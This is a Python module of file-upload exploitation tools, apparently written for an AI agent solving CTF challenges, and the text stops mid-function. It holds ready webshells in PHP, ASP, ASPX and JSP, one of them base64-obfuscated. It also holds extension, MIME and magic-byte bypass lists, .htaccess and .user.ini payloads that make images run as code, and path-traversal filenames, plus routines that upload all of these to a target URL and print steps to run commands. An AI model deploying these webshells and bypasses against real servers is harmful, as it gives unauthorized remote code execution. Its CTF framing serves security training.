"""
File upload testing tools for CTF solving.

Provides utilities for testing file upload vulnerabilities including
extension bypass, MIME type manipulation, webshell deployment,
.htaccess/.user.ini attacks, and path traversal testing.
"""

import json
import os
import re
from typing import Dict, List, Optional, Tuple
from urllib.parse import urljoin
import requests


class FileUploadTool:
    """
    FileUploadTool: test file upload vulnerabilities in web applications.

    Tool interface (FAIR-style):
      - `name` and `description` class attributes.
      - `.use(tool_input: str) -> str`, where tool_input is JSON.

    Expected JSON tool_input format:

        {
          "url": "http://target.com/upload",       # Upload endpoint
          "file_param": "file",                     # Form field name for file
          "operation": "test_extensions",           # Operation to perform
          "data": {"other": "value"},               # Optional extra form data
          "headers": {"Cookie": "..."},             # Optional headers
          "timeout": 30                             # Optional timeout
        }

    Supported operations:
      - test_extensions: Try various extension bypass techniques
      - test_mime: Try MIME type manipulation
      - test_content: Generate files with various content types
      - generate_webshell: Get webshell payloads for different languages
      - full_test: Run comprehensive upload tests
      - upload_custom: Upload a file with exact filename (e.g., .htaccess)
      - upload_htaccess: Upload .htaccess to enable PHP execution on images
      - upload_userini: Upload .user.ini for PHP-FPM environments
      - test_traversal: Test path traversal in filenames
      - generate_htaccess: Generate .htaccess payloads without uploading
    """

    name: str = "file_upload"
    description: str = (
        "Test file upload vulnerabilities. Input must be JSON with 'url' (upload endpoint), "
        "'file_param' (form field name), and 'operation'. Operations: test_extensions, test_mime, "
        "test_content, generate_webshell, full_test, upload_custom (exact filename), "
        "upload_htaccess (.htaccess attack), upload_userini (.user.ini attack), "
        "test_traversal (path traversal), generate_htaccess (get payloads). "
        "For upload_custom: include 'filename' and 'content'. "
        "For upload_htaccess: optionally include 'target_ext' (default: .jpg)."
    )

    # Extension bypass techniques
    EXTENSION_BYPASSES = {
        "php": [
            ".php",
            ".phtml",
            ".php3",
            ".php4",
            ".php5",
            ".php7",
            ".phps",
            ".phar",
            ".pgif",
            ".pht",
            ".PHP",
            ".Php",
            ".pHp",
            ".php.jpg",
            ".php.png",
            ".php.gif",
            ".jpg.php",
            ".php%00.jpg",
            ".php%00.png",
            ".php\x00.jpg",
            ".php;.jpg",
            ".php:.jpg",
            ".php/",
            ".php.",
            ".php...",
            ".php.....",
            ".php%20",
            ".php%0a",
            ".php%0d%0a",
        ],
        "asp": [
            ".asp",
            ".aspx",
            ".asa",
            ".cer",
            ".cdx",
            ".ashx",
            ".asmx",
            ".asp;.jpg",
            ".asp%00.jpg",
            ".asp:.jpg",
        ],
        "jsp": [
            ".jsp",
            ".jspx",
            ".jsw",
            ".jsv",
            ".jspf",
            ".jsp%00.jpg",
            ".jsp;.jpg",
        ],
        "general": [
            ".html",
            ".htm",
            ".svg",
            ".xml",
            ".xhtml",
            ".shtml",
            ".htaccess",
            ".config",
        ],
    }

    # MIME types for bypass
    MIME_TYPES = {
        "image": [
            "image/jpeg",
            "image/png",
            "image/gif",
            "image/bmp",
            "image/webp",
            "image/svg+xml",
        ],
        "document": [
            "application/pdf",
            "text/plain",
            "application/msword",
        ],
        "php": [
            "application/x-php",
            "application/php",
            "text/php",
            "text/x-php",
        ],
        "null": [
            "",
            "application/octet-stream",
        ],
    }

    # Magic bytes / file signatures
    MAGIC_BYTES = {
        "gif": b"GIF89a",
        "png": b"\x89PNG\r\n\x1a\n",
        "jpg": b"\xff\xd8\xff\xe0\x00\x10JFIF",
        "bmp": b"BM",
        "pdf": b"%PDF-1.4",
        "zip": b"PK\x03\x04",
    }

    # Simple webshells
    WEBSHELLS = {
        "php": {
            "simple": "<?php system($_GET['cmd']); ?>",
            "eval": "<?php eval($_GET['c']); ?>",
            "shell_exec": "<?php echo shell_exec($_GET['cmd']); ?>",
            "passthru": "<?php passthru($_GET['cmd']); ?>",
            "backtick": "<?php echo `$_GET['cmd']`; ?>",
            "short": "<?=`$_GET[0]`?>",
            "base64": "<?php eval(base64_decode('c3lzdGVtKCRfR0VUWydjbWQnXSk7')); ?>",
            "preg_replace": "<?php preg_replace('/.*/e', \"system('$_GET[cmd]')\", ''); ?>",
        },
        "asp": {
            "simple": '<%eval request("cmd")%>',
            "execute": '<%execute(request("cmd"))%>',
        },
        "aspx": {
            "simple": '<%@ Page Language="C#" %><%Response.Write(new System.Diagnostics.Process(){StartInfo=new System.Diagnostics.ProcessStartInfo(){FileName="cmd.exe",Arguments="/c "+Request["cmd"],UseShellExecute=false,RedirectStandardOutput=true}}.Start().StandardOutput.ReadToEnd());%>',
        },
        "jsp": {
            "simple": '<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>',
            "process": '<%@ page import="java.io.*" %><%Process p=Runtime.getRuntime().exec(request.getParameter("cmd"));BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));String line;while((line=br.readLine())!=null){out.println(line);}%>',
        },
    }

    # .htaccess payloads for Apache
    HTACCESS_PAYLOADS = {
        "addtype_jpg": "AddType application/x-httpd-php .jpg",
        "addtype_gif": "AddType application/x-httpd-php .gif",
        "addtype_png": "AddType application/x-httpd-php .png",
        "addtype_all": "AddType application/x-httpd-php .jpg .gif .png .txt",
        "sethandler": "SetHandler application/x-httpd-php",
        "sethandler_match": "<FilesMatch \"\\.(jpg|gif|png)$\">\n    SetHandler application/x-httpd-php\n</FilesMatch>",
        "addhandler": "AddHandler php-script .jpg",
        "options_exec": "Options +ExecCGI\nAddHandler cgi-script .jpg",
        "php_value": "php_value auto_prepend_file shell.jpg",
        "php_flag": "php_flag engine on",
    }

    # .user.ini payloads for PHP-FPM
    USERINI_PAYLOADS = {
        "prepend": "auto_prepend_file=shell.jpg",
        "append": "auto_append_file=shell.jpg",
        "prepend_gif": "auto_prepend_file=shell.gif",
        "prepend_png": "auto_prepend_file=shell.png",
        "prepend_txt": "auto_prepend_file=shell.txt",
    }

    # Path traversal payloads for filename
    TRAVERSAL_PAYLOADS = [
        "../shell.php",
        "../../shell.php",
        "../../../shell.php",
        "....//shell.php",
        "....//....//shell.php",
        "..\\shell.php",
        "..\\..\\shell.php",
        "....\\\\shell.php",
        "../../../var/www/html/shell.php",
        "..%2f..%2fshell.php",
        "..%252f..%252fshell.php",
        "..%c0%afshell.php",
        "..%c1%9cshell.php",
        "/var/www/html/shell.php",
        "C:\\inetpub\\wwwroot\\shell.php",
    ]

    def __init__(self, session: Optional[requests.Session] = None):
        self.session = session or requests.Session()

    def use(self, tool_input: str) -> str:
        # Parse JSON input
        try:
            data = json.loads(tool_input) if tool_input else {}
        except json.JSONDecodeError as exc:
            return f"[FileUploadTool] Error: tool_input must be JSON. Decoding failed with: {exc}"

        operation = data.get("operation", "").lower().strip()
        if not operation:
            return "[FileUploadTool] Error: 'operation' is required."

        valid_ops = [
            "test_extensions", "test_mime", "test_content", "generate_webshell",
            "full_test", "upload_custom", "upload_htaccess", "upload_userini",
            "test_traversal", "generate_htaccess"
        ]
        if operation not in valid_ops:
            return f"[FileUploadTool] Error: Unknown operation '{operation}'. Valid: {', '.join(valid_ops)}"

        try:
            # Operations that don't need URL
            if operation == "generate_webshell":
                return self._generate_webshell(data)
            elif operation == "test_content":
                return self._generate_test_content(data)
            elif operation == "generate_htaccess":
                return self._generate_htaccess(data)
            else:
                # These operations need URL
                url = data.get("url", "").strip()
                if not url:
                    return "[FileUploadTool] Error: 'url' is required for this operation."

                file_param = data.get("file_param", "file")
                extra_data = data.get("data", {})
                headers = data.get("headers", {})
                timeout = data.get("timeout", 30)

                if operation == "test_extensions":
                    return self._test_extensions(url, file_param, extra_data, headers, timeout, data)
                elif operation == "test_mime":
                    return self._test_mime(url, file_param, extra_data, headers, timeout, data)
                elif operation == "full_test":
                    return self._full_test(url, file_param, extra_data, headers, timeout, data)
                elif operation == "upload_custom":
                    return self._upload_custom(url, file_param, extra_data, headers, timeout, data)
                elif operation == "upload_htaccess":
                    return self._upload_htaccess(url, file_param, extra_data, headers, timeout, data)
                elif operation == "upload_userini":
                    return self._upload_userini(url, file_param, extra_data, headers, timeout, data)
                elif operation == "test_traversal":
                    return self._test_traversal(url, file_param, extra_data, headers, timeout, data)

        except requests.RequestException as e:
            return f"[FileUploadTool] Request error: {e}"
        except Exception as e:
            return f"[FileUploadTool] Error: {e}"

        return "[FileUploadTool] Error: Operation not implemented."

    def _upload_file(
        self,
        url: str,
        file_param: str,
        filename: str,
        content: bytes,
        content_type: str,
        extra_data: dict,
        headers: dict,
        timeout: int,
    ) -> Tuple[int, str, int]:
        """Upload a file and return (status_code, response_text, content_length)."""
        files = {
            file_param: (filename, content, content_type)
        }
        resp = self.session.post(
            url,
            files=files,
            data=extra_data,
            headers=headers,
            timeout=timeout
        )
        return resp.status_code, resp.text, len(resp.content)

    def _test_extensions(
        self,
        url: str,
        file_param: str,
        extra_data: dict,
        headers: dict,
        timeout: int,
        data: dict,
    ) -> str:
        """Test various extension bypass techniques."""
        results = ["[FileUploadTool] Extension Bypass Test", "=" * 50]

        language = data.get("language", "php").lower()
        if language not in self.EXTENSION_BYPASSES:
            language = "php"

        extensions = self.EXTENSION_BYPASSES[language] + self.EXTENSION_BYPASSES["general"]

        # Get webshell content
        shell = self.WEBSHELLS.get(language, self.WEBSHELLS["php"])
        content = shell.get("simple", "<?php system($_GET['cmd']); ?>").encode()

        successful = []
        failed = []
        first_success_response = None  # Capture first successful response body
        discovered_paths = []  # Paths extracted from responses

        results.append(f"\nTesting {len(extensions)} extension variants for {language}...")
        results.append("")

        # First, get baseline with a safe extension
        try:
            baseline_status, baseline_text, _ = self._upload_file(
                url, file_param, "test.txt", b"test content",
                "text/plain", extra_data, headers, timeout
            )
            results.append(f"Baseline (.txt): Status {baseline_status}")
            # Check baseline response for path info
            baseline_path = self._extract_upload_path(baseline_text)
            if baseline_path:
                discovered_paths.append(("baseline (test.txt)", baseline_path))
        except Exception as e:
            results.append(f"Baseline failed: {e}")
            baseline_status = 0

        for ext in extensions:
            filename = f"shell{ext}"
            try:
                status, text, _ = self._upload_file(
                    url, file_param, filename, content,
                    "application/octet-stream", extra_data, headers, timeout
                )

                # Check for success indicators
                is_success = self._check_upload_success(status, text, baseline_status)

                if is_success:
                    successful.append((filename, status))
                    results.append(f"[+] SUCCESS: {filename} (Status: {status})")

                    # Capture first successful response for display
                    if first_success_response is None:
                        first_success_response = (filename, text)

                    # Extract upload path from response
                    extracted_path = self._extract_upload_path(text)
                    if extracted_path and extracted_path not in [p for _, p in discovered_paths]:
                        discovered_paths.append((filename, extracted_path))
                else:
                    failed.append((filename, status))
            except Exception as e:
                failed.append((filename, str(e)))

        results.append("")
        results.append("=== Summary ===")
        results.append(f"Successful uploads: {len(successful)}")
        results.append(f"Failed uploads: {len(failed)}")

        if successful:
            results.append("")
            results.append("=== Successful Extensions ===")
            for fname, status in successful:
                results.append(f"  {fname} (Status: {status})")

        # Show discovered upload paths
        if discovered_paths:
            results.append("")
            results.append("=== Discovered Upload Paths ===")
            for fname, path in discovered_paths:
                results.append(f"  [+] {fname} -> {path}")

        # Show first successful response body (critical for path discovery)
        if first_success_response:
            fname, resp_text = first_success_response
            results.append("")
            results.append(f"=== First Successful Response ({fname}) ===")
            snippet = resp_text[:500] if resp_text else "(empty)"
            results.append(snippet)

        return "\n".join(results)

    def _test_mime(
        self,
        url: str,
        file_param: str,
        extra_data: dict,
        headers: dict,
        timeout: int,
        data: dict,
    ) -> str:
        """Test MIME type manipulation."""
        results = ["[FileUploadTool] MIME Type Bypass Test", "=" * 50]

        language = data.get("language", "php").lower()
        extension = data.get("extension", ".php")

        shell = self.WEBSHELLS.get(language, self.WEBSHELLS["php"])
        content = shell.get("simple", "<?php system($_GET['cmd']); ?>").encode()

        filename = f"shell{extension}"

        # All MIME types to try
        all_mimes = []
        for category, mimes in self.MIME_TYPES.items():
            all_mimes.extend(mimes)

        successful = []

        results.append(f"\nTesting {len(all_mimes)} MIME types for {filename}...")
        results.append("")

        for mime in all_mimes:
            try:
                status, text, _ = self._upload_file(
                    url, file_param, filename, content,
                    mime, extra_data, headers, timeout
                )

                is_success = self._check_upload_success(status, text, 200)

                if is_success:
                    successful.append((mime, status))
                    results.append(f"[+] SUCCESS: {mime} (Status: {status})")
            except Exception:
                pass

        results.append("")
        results.append("=== Summary ===")
        results.append(f"Successful MIME types: {len(successful)}")

        if successful:
            results.append("")
            results.append("=== Working MIME Types ===")
            for mime, status in successful:
                display_mime = mime if mime else "(empty)"
                results.append(f"  {display_mime} (Status: {status})")

        return "\n".join(results)

    def _generate_test_content(self, data: dict) -> str:
        """Generate test file content with magic bytes + payload."""
        results = ["[FileUploadTool] Test Content Generator", "=" * 50]

        language = data.get("language", "php").lower()
        magic_type = data.get("magic", "gif").lower()
        shell_type = data.get("shell_type", "simple")

        # Get magic bytes
        if magic_type in self.MAGIC_BYTES:
            magic = self.MAGIC_BYTES[magic_type]
        else:
            magic = self.MAGIC_BYTES["gif"]
            results.append(f"[*] Unknown magic type '{magic_type}', using GIF")

        # Get webshell
        shells = self.WEBSHELLS.get(language, self.WEBSHELLS["php"])
        shell = shells.get(shell_type, shells.get("simple", "<?php system($_GET['cmd']); ?>"))

        # Combine magic bytes + shell
        combined = magic + b"\n" + shell.encode()

        results.append("")
        results.append(f"Language: {language}")
        results.append(f"Magic bytes: {magic_type} ({magic.hex()[:20]}...)")
        results.append(f"Shell type: {shell_type}")
        results.append("")
        results.append("=== Generated Content (hex) ===")
        results.append(combined.hex())
        results.append("")
        results.append("=== Generated Content (readable) ===")

        try:
            readable = combined.decode('utf-8', errors='replace')
            results.append(readable[:500])
        except Exception:
            results.append("[Binary content]")

        results.append("")
        results.append("=== Suggested Filenames ===")
        ext_map = {"php": ".php.gif", "asp": ".asp.gif", "jsp": ".jsp.gif"}
        ext = ext_map.get(language, ".php.gif")
        results.append(f"  shell{ext}")
        results.append(f"  image.{magic_type}")
        results.append(f"  test{ext}")

        return "\n".join(results)

    def _generate_webshell(self, data: dict) -> str:
        """Generate webshell payloads for specified language."""
        results = ["[FileUploadTool] Webshell Generator", "=" * 50]

        language = data.get("language", "php").lower()
        command = data.get("command", "cmd")

        if language not in self.WEBSHELLS:
            langs = ", ".join(self.WEBSHELLS.keys())
            return f"[FileUploadTool] Error: Unknown language '{language}'. Supported: {langs}"

        shells = self.WEBSHELLS[language]

        results.append("")
        results.append(f"Language: {language.upper()}")
        results.append(f"Command parameter: {command}")
        results.append("")

        for name, shell in shells.items():
            results.append(f"=== {name} ===")
            # Replace default command parameter if specified
            modified_shell = shell
            if command != "cmd":
                modified_shell = shell.replace("cmd", command).replace("'c'", f"'{command}'")
            results.append(modified_shell)
            results.append("")

        # Provide polyglot examples
        results.append("=== Polyglot Examples ===")
        results.append("")

        results.append("--- GIF + PHP ---")
        results.append(f"GIF89a<?php system($_GET['{command}']); ?>")
        results.append("")

        results.append("--- PNG + PHP (may cause issues) ---")
        png_header = "\\x89PNG\\r\\n\\x1a\\n"
        results.append(f"{png_header}<?php system($_GET['{command}']); ?>")
        results.append("")

        results.append("=== Tips ===")
        results.append("1. Try different extensions: .php, .phtml, .php5, .phar")
        results.append("2. Use Content-Type: image/gif or image/jpeg")
        results.append("3. Null byte injection: shell.php%00.gif")
        results.append("4. Double extension: shell.php.gif or shell.gif.php")
        results.append("5. Case variation: shell.PhP, shell.PHP")

        return "\n".join(results)

    def _full_test(
        self,
        url: str,
        file_param: str,
        extra_data: dict,
        headers: dict,
        timeout: int,
        data: dict,
    ) -> str:
        """Run comprehensive file upload tests."""
        results = ["[FileUploadTool] Comprehensive Upload Test", "=" * 50]
        results.append(f"URL: {url}")
        results.append(f"File parameter: {file_param}")
        results.append("")

        language = data.get("language", "php").lower()
        successful_uploads = []

        # Phase 1: Test basic extensions
        results.append("=== Phase 1: Extension Testing ===")
        extensions = self.EXTENSION_BYPASSES.get(language, self.EXTENSION_BYPASSES["php"])[:10]
        shell = self.WEBSHELLS.get(language, self.WEBSHELLS["php"])
        content = shell.get("simple", "<?php system($_GET['cmd']); ?>").encode()

        for ext in extensions:
            filename = f"test{ext}"
            try:
                status, text, _ = self._upload_file(
                    url, file_param, filename, content,
                    "application/octet-stream", extra_data, headers, timeout
                )
                if self._check_upload_success(status, text, 200):
                    successful_uploads.append(("extension", filename, "application/octet-stream"))
                    results.append(f"[+] {filename}: SUCCESS")
            except Exception as e:
                results.append(f"[-] {filename}: {e}")

        results.append("")

        # Phase 2: Test MIME type bypass
        results.append("=== Phase 2: MIME Type Bypass ===")
        test_ext = extensions[0] if extensions else ".php"
        for mime in self.MIME_TYPES["image"][:3]:
            filename = f"test{test_ext}"
            try:
                status, text, _ = self._upload_file(
                    url, file_param, filename, content,
                    mime, extra_data, headers, timeout
                )
                if self._check_upload_success(status, text, 200):
                    successful_uploads.append(("mime", filename, mime))
                    results.append(f"[+] {mime}: SUCCESS")
            except Exception:
                pass

        results.append("")

        # Phase 3: Test magic bytes + extension
        results.append("=== Phase 3: Magic Bytes + Extension ===")
        for magic_name, magic_bytes in list(self.MAGIC_BYTES.items())[:3]:
            polyglot = magic_bytes + b"\n" + content
            filename = f"test.{magic_name}{test_ext}"
            try:
                status, text, _ = self._upload_file(
                    url, file_param, filename, polyglot,
                    f"image/{magic_name}", extra_data, headers, timeout
                )
                if self._check_upload_success(status, text, 200):
                    successful_uploads.append(("magic", filename, f"image/{magic_name}"))
                    results.append(f"[+] {filename} with {magic_name} magic: SUCCESS")
            except Exception:
                pass

        results.append("")

        # Summary
        results.append("=" * 50)
        results.append("=== SUMMARY ===")
        results.append(f"Total successful uploads: {len(successful_uploads)}")
        results.append("")

        if successful_uploads:
            results.append("=== Successful Techniques ===")
            for technique, filename, mime in successful_uploads:
                results.append(f"  [{technique}] {filename} ({mime})")

            results.append("")
            results.append("=== Next Steps ===")
            results.append("1. Find the uploaded file location")
            results.append("2. Try to execute the shell: /uploads/shell.php?cmd=id")
            results.append("3. Check for path disclosure in error messages")
            results.append("4. Look for /upload, /uploads, /files, /images directories")
        else:
            results.append("[!] No successful uploads. Try:")
            results.append("  - Different file parameter names")
            results.append("  - Adding required form fields")
            results.append("  - Check for CSRF tokens")
            results.append("  - Verify authentication")

        return "\n".join(results)

    def _check_upload_success(self, status: int, text: str, baseline_status: int) -> bool:
        """Check if upload was successful based on response."""
        # Status code checks
        if status >= 400:
            return False

        # Common success indicators
        success_indicators = [
            "success",
            "uploaded",
            "file saved",
            "upload complete",
            "file uploaded successfully",
        ]

        text_lower = text.lower()
        for indicator in success_indicators:
            if indicator in text_lower:
                return True

        # Common failure indicators
        failure_indicators = [
            "not allowed",
            "invalid file",
            "invalid extension",
            "blocked",
            "denied",
            "rejected",
            "failed",
            "error",
            "forbidden",
        ]

        for indicator in failure_indicators:
            if indicator in text_lower:
                return False

        # If status is OK and no explicit failure, consider it a potential success
        return status == 200 or status == 201 or status == 302

    def _extract_upload_path(self, response_text: str) -> Optional[str]:
        """Extract uploaded file path from response text."""
        patterns = [
            # JSON-style responses
            r'"(?:path|file|url|location|filename)"[:\s]*"([^"]+\.\w+)"',
            # Plain text responses
            r'(?:uploaded to|saved at|file location|path)[:\s]*["\']?([^\s"\'<>]+\.\w+)',
            # HTML responses with paths
            r'(?:href|src)=["\']([^"\']*uploads?[^"\']*\.\w+)["\']',
            # Absolute paths
            r'(/[\w\-./]+/[\w\-]+\.\w{2,5})',
        ]
        for pattern in patterns:
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                return match.group(1)
        return None

    def _upload_custom(
        self,
        url: str,
        file_param: str,
        extra_data: dict,
        headers: dict,
        timeout: int,
        data: dict,
    ) -> str:
        """Upload a file with exact filename specified by user."""
        results = ["[FileUploadTool] Custom File Upload", "=" * 50]

        filename = data.get("filename", "").strip()
        content = data.get("content", "")
        content_type = data.get("content_type", "application/octet-stream")

        if not filename:
            return "[FileUploadTool] Error: 'filename' is required for upload_custom operation."

        # Convert content to bytes
        if isinstance(content, str):
            content_bytes = content.encode('utf-8')
        else:
            content_bytes = content

        results.append(f"URL: {url}")
        results.append(f"Filename: {filename}")
        results.append(f"Content-Type: {content_type}")
        results.append(f"Content length: {len(content_bytes)} bytes")
        results.append("")

        try:
            status, text, size = self._upload_file(
                url, file_param, filename, content_bytes,
                content_type, extra_data, headers, timeout
            )

            results.append(f"=== Response ===")
            results.append(f"Status: {status}")
            results.append(f"Response length: {size} bytes")
            results.append("")

            # Try to extract upload path
            extracted_path = self._extract_upload_path(text)
            if extracted_path:
                results.append(f"[+] Detected upload path: {extracted_path}")
                results.append("")

            # Check success
            is_success = self._check_upload_success(status, text, 200)
            if is_success:
                results.append("[+] Upload appears SUCCESSFUL")
            else:
                results.append("[-] Upload may have FAILED")

            results.append("")
            results.append("=== Response Body (first 500 chars) ===")
            results.append(text[:500] if text else "(empty)")

        except Exception as e:
            results.append(f"[!] Error: {e}")

        return "\n".join(results)

    def _upload_htaccess(
        self,
        url: str,
        file_param: str,
        extra_data: dict,
        headers: dict,
        timeout: int,
        data: dict,
    ) -> str:
        """Upload .htaccess file to enable PHP execution on image files."""
        results = ["[FileUploadTool] .htaccess Upload Attack", "=" * 50]

        target_ext = data.get("target_ext", ".jpg").strip()
        if not target_ext.startswith("."):
            target_ext = "." + target_ext

        # Try multiple .htaccess payloads
        payloads_to_try = [
            ("addtype", f"AddType application/x-httpd-php {target_ext}"),
            ("sethandler", f'<FilesMatch "\\{target_ext}$">\n    SetHandler application/x-httpd-php\n</FilesMatch>'),
            ("addhandler", f"AddHandler php-script {target_ext}"),
            ("php_value", f"php_value auto_prepend_file shell{target_ext}"),
        ]

        results.append(f"URL: {url}")
        results.append(f"Target extension: {target_ext}")
        results.append(f"Testing {len(payloads_to_try)} .htaccess payloads...")
        results.append("")

        successful = []

        for name, payload in payloads_to_try:
            try:
                # Upload .htaccess with EXACT filename
                status, text, _ = self._upload_file(
                    url, file_param, ".htaccess", payload.encode('utf-8'),
                    "text/plain", extra_data, headers, timeout
                )

                is_success = self._check_upload_success(status, text, 200)
                if is_success:
                    successful.append((name, payload, status))
                    results.append(f"[+] SUCCESS: {name} (Status: {status})")
                else:
                    results.append(f"[-] FAILED: {name} (Status: {status})")

            except Exception as e:
                results.append(f"[!] ERROR: {name} - {e}")

        results.append("")
        results.append("=" * 50)

        if successful:
            results.append(f"[+] {len(successful)} payload(s) uploaded successfully!")
            results.append("")
            results.append("=== Next Steps ===")
            results.append(f"1. Upload a PHP webshell with {target_ext} extension:")
            results.append(f"   Filename: shell{target_ext}")
            results.append(f"   Content: <?php system($_GET['cmd']); ?>")
            results.append("")
            results.append(f"2. Access the shell:")
            results.append(f"   /uploads/shell{target_ext}?cmd=id")
            results.append(f"   /images/shell{target_ext}?cmd=cat /flag.txt")
            results.append("")
            results.append("=== Successful Payloads ===")
            for name, payload, status in successful:
                results.append(f"\n--- {name} ---")
                results.append(payload)
        else:
            results.append("[-] No payloads succeeded. Possible reasons:")
            results.append("  - .htaccess files are blocked")
            results.append("  - File renamed on upload (not kept as .htaccess)")
            results.append("  - AllowOverride is disabled on server")
            results.append("  - Try upload_custom with exact filename '.htaccess'")

        return "\n".join(results)

    def _upload_userini(
        self,
        url: str,
        file_param: str,
        extra_data: dict,
        headers: dict,
        timeout: int,
        data: dict,
    ) -> str:
        """Upload .user.ini file for PHP-FPM environments."""
        results = ["[FileUploadTool] .user.ini Upload Attack", "=" * 50]

        shell_file = data.get("shell_file", "shell.jpg").strip()

        # .user.ini payloads
        payloads_to_try = [
            ("prepend", f"auto_prepend_file={shell_file}"),
            ("append", f"auto_append_file={shell_file}"),
            ("both", f"auto_prepend_file={shell_file}\nauto_append_file={shell_file}"),
        ]

        results.append(f"URL: {url}")
        results.append(f"Shell file: {shell_file}")
        results.append(f"Testing {len(payloads_to_try)} .user.ini payloads...")
        results.append("")
        results.append("[*] Note: .user.ini works on PHP-FPM, not Apache mod_php")
        results.append("")

        successful = []

        for name, payload in payloads_to_try:
            try:
                status, text, _ = self._upload_file(
                    url, file_param, ".user.ini", payload.encode('utf-8'),
                    "text/plain", extra_data, headers, timeout
                )

                is_success = self._check_upload_success(status, text, 200)
                if is_success:
                    successful.append((name, payload, status))
                    results.append(f"[+] SUCCESS: {name} (Status: {status})")
                else:
                    results.append(f"[-] FAILED: {name} (Status: {status})")

            except Exception as e:
                results.append(f"[!] ERROR: {name} - {e}")

        results.append("")
        results.append("=" * 50)

        if successful:
            results.append(f"[+] {len(successful)} payload(s) uploaded successfully!")
            results.append("")
            results.append("=== Next Steps ===")
            results.append(f"1. Upload PHP webshell as: {shell_file}")
            results.append("   Content: <?php system($_GET['cmd']); ?>")
            results.append("")
            results.append("2. Access ANY PHP file in the same directory")
            results.append("   (The shell will be auto-prepended/appended)")
            results.append("")
            results.append("3. Wait ~5 minutes for .user.ini to be parsed")
            results.append("   (user_ini.cache_ttl default is 300 seconds)")
        else:
            results.append("[-] No payloads succeeded. Server may not use PHP-FPM.")

        return "\n".join(results)

    def _test_traversal(
        self,
        url: str,
        file_param: str,
        extra_data: dict,
        headers: dict,
        timeout: int,
        data: dict,
    ) -> str:
        """Test path traversal vulnerabilities in filename."""
        results = ["[FileUploadTool] Path Traversal Test", "=" * 50]

        language = data.get("language", "php").lower()
        shell = self.WEBSHELLS.get(language, self.WEBSHELLS["php"])
        content = shell.get("simple", "<?php system($_GET['cmd']); ?>").encode()

        results.append(f"URL: {url}")
        results.append(f"Testing {len(self.TRAVERSAL_PAYLOADS)} traversal payloads...")
        results.append("")

        successful = []
        interesting = []

        for payload in self.TRAVERSAL_PAYLOADS:
            try:
                status, text, _ = self._upload_file(
                    url, file_param, payload, content,
                    "application/octet-stream", extra_data, headers, timeout
                )

                # Check for different responses that indicate traversal worked
                if status == 200 or status == 201:
                    # Check if filename was sanitized
                    if ".." not in text.lower() and "traversal" not in text.lower():
                        successful.append((payload, status, "Accepted"))
                        results.append(f"[+] ACCEPTED: {payload}")
                    else:
                        interesting.append((payload, status, text[:100]))
                        results.append(f"[?] INTERESTING: {payload}")
                elif status == 403 or status == 400:
                    results.append(f"[-] BLOCKED: {payload}")
                else:
                    results.append(f"[?] Status {status}: {payload}")

            except Exception as e:
                results.append(f"[!] ERROR: {payload} - {e}")

        results.append("")
        results.append("=" * 50)
        results.append("=== Summary ===")
        results.append(f"Accepted: {len(successful)}")
        results.append(f"Interesting: {len(interesting)}")
        results.append("")

        if successful:
            results.append("=== Potentially Vulnerable Payloads ===")
            for payload, status, note in successful:
                results.append(f"  {payload}")
            results.append("")
            results.append("=== Verification Steps ===")
            results.append("1. Check if file was written outside upload directory")
            results.append("2. Try accessing: /shell.php?cmd=id")
            results.append("3. Check web root: /var/www/html/shell.php")
        else:
            results.append("[-] No traversal payloads accepted.")
            results.append("    Server may sanitize filenames properly.")

        return "\n".join(results)

    def _generate_htaccess(self, data: dict) -> str:
        """Generate .htaccess payloads without uploading."""
        results = ["[FileUploadTool] .htaccess Payload Generator", "=" * 50]

        target_ext = data.get("target_ext", ".jpg").strip()
        if not target_ext.startswith("."):
            target_ext = "." + target_ext

        results.append(f"Target extension: {target_ext}")
        results.append("")

        results.append("=== AddType (Most Common) ===")
        results.append(f"AddType application/x-httpd-php {target_ext}")
        results.append("")

        results.append("=== SetHandler with FilesMatch ===")
        results.append(f'<FilesMatch "\\{target_ext}$">')
        results.append("    SetHandler application/x-httpd-php")
        results.append("</FilesMatch>")
        results.append("")

        results.append("=== AddHandler ===")
        results.append(f"AddHandler php-script {target_ext}")
        results.append("")

        results.append("=== php_value (if allowed) ===")
        results.append(f"php_value auto_prepend_file shell{target_ext}")
        results.append("")

        results.append("=== Multiple Extensions ===")
        results.append("AddType application/x-httpd-php .jpg .gif .png .txt")
        results.append("")

        results.append("=== Options + CGI ===")
        results.append("Options +ExecCGI")
        results.append(f"AddHandler cgi-script {target_ext}")
        results.append("")

        results.append("=== .user.ini Alternative (PHP-FPM) ===")
        results.append(f"auto_prepend_file=shell{target_ext}")
        results.append("")

        results.append("=== Usage Instructions ===")
        results.append("1. Upload .htaccess with one of the payloads above")
        results.append("   - Use upload_custom with filename='.htaccess'")
        results.append(f"2. Upload PHP webshell as shell{target_ext}")
        results.append(f"3. Access: /uploads/shell{target_ext}?cmd=id")

        return "\n".join(results)


class UploadLocationFinder:
    """
    UploadLocationFinder: find where uploaded files are stored.

    This tool helps locate uploaded files by testing common paths.
    """

    name: str = "upload_location_finder"
    description: str = (
        "Find uploaded file locations by testing common paths. Input must be JSON with "
        "'base_url' (target website), 'filename' (uploaded file name), and optionally "
        "'custom_paths' (list of paths to check). Tests common upload directories."
    )

    # Common upload directories
    COMMON_PATHS = [
        "/uploads/",
        "/upload/",
        "/files/",
        "/images/",
        "/img/",
        "/media/",
        "/assets/",
        "/static/",
        "/content/",
        "/data/",
        "/tmp/",
        "/temp/",
        "/attachments/",
        "/public/uploads/",
        "/public/files/",
        "/wp-content/uploads/",
        "/storage/",
        "/storage/uploads/",
        "/app/uploads/",
        "/user_uploads/",
        "/file_uploads/",
    ]

    def __init__(self, session: Optional[requests.Session] = None):
        self.session = session or requests.Session()

    def use(self, tool_input: str) -> str:
        try:
            data = json.loads(tool_input) if tool_input else {}
        except json.JSONDecodeError as exc:
            return f"[UploadLocationFinder] Error: tool_input must be JSON: {exc}"

        base_url = data.get("base_url", "").strip().rstrip("/")
        filename = data.get("filename", "").strip()
        custom_paths = data.get("custom_paths", [])
        timeout = data.get("timeout", 10)

        if not base_url:
            return "[UploadLocationFinder] Error: 'base_url' is required."
        if not filename:
            return "[UploadLocationFinder] Error: 'filename' is required."

        paths_to_check = custom_paths + self.COMMON_PATHS

        results = ["[UploadLocationFinder] Searching for uploaded file", "=" * 50]
        results.append(f"Base URL: {base_url}")
        results.append(f"Filename: {filename}")
        results.append(f"Checking {len(paths_to_check)} paths...")
        results.append("")

        found = []

        for path in paths_to_check:
            full_url = f"{base_url}{path}{filename}"
